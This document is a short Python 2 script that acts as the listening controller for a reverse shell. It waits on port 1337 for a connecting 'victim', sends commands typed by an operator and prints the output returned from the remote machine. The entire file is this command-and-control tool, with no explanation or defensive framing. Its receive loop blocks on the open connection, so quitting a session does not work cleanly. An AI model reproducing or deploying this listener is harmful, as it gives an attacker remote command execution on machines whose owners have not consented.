import socket
import threading
bind_ip= "0.0.0.0"
bind_port = 1337
server = socket.socket()
server.bind((bind_ip,bind_port))
server.listen(5)
print "[*] Listening on %s:%d" % (bind_ip,bind_port)
def handle_client(client_socket):
        # print out what the victim sends
        request = client_socket.recv(1024)
        print "[*] Received: %s" % request
        # send back a packet
	while (1):
	    command = raw_input("Enter a command ~$  ")
            client_socket.send(command)
	    # print out command result
            result = client_socket.recv(4048)
            while result != '':
		print "[*] Command output : %s" % result
		result = client_socket.recv(4048)
            if command == 'quit' :
		client_socket.close()
while True:
        client,addr = server.accept()
        print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
        # spin up our client thread to handle incoming data
        client_handler = threading.Thread(target=handle_client,args=(client,))
        client_handler.start()

